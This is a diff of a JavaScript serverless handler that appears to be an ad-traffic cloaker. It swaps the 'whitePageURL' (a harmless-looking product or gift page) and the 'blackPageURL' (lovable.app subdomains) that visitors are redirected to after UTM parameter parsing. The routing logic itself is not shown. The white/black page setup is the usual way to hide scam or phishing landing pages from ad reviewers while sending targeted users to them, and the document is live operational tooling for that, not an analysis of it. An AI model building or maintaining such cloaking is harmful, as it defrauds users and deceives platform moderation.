@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://toyscentral.es/products/spidey-and-his-amazing-friends-marvel-speak-and-go-tracee-bot-electronic-spider-toy-soundactivated-crawls-for-kids-ages-3-and-up";
-    const blackPageURL = "https://casssshlov.lovable.app//";
+    const whitePageURL = "https://www.bunchesbaskets.es/gifts/new-arrival-celebration";
+    const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
